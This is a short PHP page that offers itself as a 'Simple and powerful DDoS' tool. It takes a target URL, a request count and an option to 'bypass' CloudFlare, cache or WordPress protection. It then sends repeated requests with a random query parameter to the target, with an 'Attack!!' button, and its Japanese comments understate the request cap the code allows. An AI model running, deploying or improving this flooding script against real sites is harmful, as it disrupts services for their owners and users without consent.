<?php
error_reporting(E_ERROR | E_PARSE);
session_start();

if (isset($_SESSION['completed'])) {
    header("Location: index.php");
    exit;
}

if (isset($_POST['url']) && isset($_POST['count']) && isset($_POST['option'])) {
    $url = $_POST['url'];
    $count = min((int)$_POST['count'], 100); // 最大10回のリクエストに制限する
    $option = $_POST['option'];

    $randomParam = rand();

    $urlWithParam = $url . '?' . $option . '=' . $randomParam;

    for ($i = 1; $i <= $count; $i++) {
        $response = file_get_contents($urlWithParam);

    }

    $_SESSION['completed'] = true;
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Simple and powerful DDoS</title>
</head>
<body>
    <h1>Simple and powerful DDoS</h1>

    <?php
    if (isset($_SESSION['completed'])) {
        echo '<p>Execution completed.</p>';
        echo "<a href=''>Back to Dashboard</a>";
    } else {
    ?>
    <form method="POST" action="">
        <label for="url">Target URL:</label>
        <input type="url" name="url" id="url" value="https://" required>
        <br>
        <label for="count">seconds:</label>
        <input type="number" name="count" id="count" min="1" max="100" value="50" required> <!-- 最小1回、最大10回のリクエストに制限する -->
        <br>
        <label for="option">Option:</label>
        <select name="option" id="option">
            <option value="id">Cache Protect Bypass</option>
            <option value="product">CloudFlare Default Bypass</option>
            <option value="p">WordPress Protect Bypass</option>
        </select><br>
        <button type="submit">Attack!!</button>
    </form>
    <?php
    }
    ?>

    <?php
    session_unset();
    session_destroy();
    ?>
</body>
</html>
